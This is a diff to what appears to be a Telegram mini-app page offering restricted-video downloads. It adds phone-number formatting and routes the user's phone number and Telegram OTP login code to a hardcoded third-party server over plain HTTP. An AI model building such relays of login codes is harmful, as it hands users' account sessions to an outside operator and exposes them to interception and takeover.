@@ -98,10 +98,10 @@
         #toast.show { visibility: visible; opacity: 1; bottom: 50px; }
         
         /* Input styling for Login */
-        .login-input { width: 90%; padding: 12px; border-radius: 8px; border: 1px solid #444; background: #000; color: #fff; margin-bottom: 10px; font-size: 16px; outline: none; text-align: center;}
+        .login-input { width: 90%; padding: 12px; border-radius: 8px; border: 1px solid #444; background: #000; color: #fff; margin-bottom: 10px; font-size: 16px; outline: none; text-align: center; letter-spacing: 1px;}
         .login-input:focus { border-color: #00ffaa; }
 
-        /* Secret Box (Original Color + Balanced Shape) */
+        /* Secret Box */
         .mystery-fab {
             position: fixed;
             bottom: 25px;
@@ -175,12 +175,12 @@
             <p style="font-size: 11px; color: #ccc; margin-bottom: 20px;">Link your account to download restricted videos using your own identity.</p>
             
             <div id="phone-sec">
-                <input type="text" id="phone-input" class="login-input" placeholder="+88017XXXXXXXX">
+                <input type="text" id="phone-input" class="login-input" placeholder="e.g. 017XXXXXXXX">
                 <button class="share-btn" onclick="sendCode()">Send OTP Code</button>
             </div>
 
             <div id="otp-sec" style="display: none;">
-                <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP (e.g. 12345)">
+                <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP (e.g. 12345)" style="letter-spacing: 5px;">
                 <button class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
             </div>
 
@@ -200,6 +200,9 @@
         const SUPABASE_URL = 'https://yctirvnryrzygoxbpvoy.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_aBcD-atruskWwoCiLr0lWw_inT8GLoN';
         
+        // --- ব্যাকএন্ড লিঙ্ক (আপনার সার্ভারের) ---
+        const BACKEND_URL = 'http://de3.bot-hosting.net:20495';
+
         const fetchHeaders = { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' };
 
         const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : '123456'; 
@@ -213,7 +216,7 @@
         let filterMode = 'all'; 
         let currentNeededRef = 3;
 
-        // Login Logic
+        // --- Login Logic ---
         let currentPhone = "";
         let currentHash = "";
 
@@ -221,12 +224,25 @@
         function closeLogin() { document.getElementById('loginModal').style.display = 'none'; }
 
         async function sendCode() {
-            currentPhone = document.getElementById('phone-input').value;
-            if(!currentPhone || !currentPhone.startsWith('+')) return showToast("Enter valid number with +country code!");
-            showToast("Requesting OTP...");
+            let rawPhone = document.getElementById('phone-input').value.trim().replace(/[-\s]/g, '');
+            if(!rawPhone) return showToast("Enter your number!");
+            
+            // Auto Format Phone Number (+88 Default for BD)
+            if (!rawPhone.startsWith('+')) {
+                if (rawPhone.startsWith('01')) {
+                    rawPhone = '+88' + rawPhone; 
+                } else if (rawPhone.startsWith('880')) {
+                    rawPhone = '+' + rawPhone;
+                } else {
+                    rawPhone = '+' + rawPhone;
+                }
+            }
+            currentPhone = rawPhone;
+
+            showToast("Requesting OTP for " + currentPhone + "...");
             
             try {
-                const res = await fetch('/api/send_code', {
+                const res = await fetch(`${BACKEND_URL}/api/send_code`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ phone: currentPhone })
@@ -238,16 +254,19 @@
                     document.getElementById('otp-sec').style.display = 'block';
                     showToast("Code sent to your Telegram!");
                 } else { showToast("Error: " + data.msg); }
-            } catch(e) { showToast("Server error or Offline!"); }
+            } catch(e) { 
+                console.error(e);
+                showToast("Server error or Mixed Content Issue!"); 
+            }
         }
 
         async function verifyCode() {
-            const otp = document.getElementById('otp-input').value;
+            const otp = document.getElementById('otp-input').value.trim();
             if(!otp) return showToast("Enter OTP!");
             showToast("Verifying account...");
             
             try {
-                const res = await fetch('/api/verify_code', {
+                const res = await fetch(`${BACKEND_URL}/api/verify_code`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ 
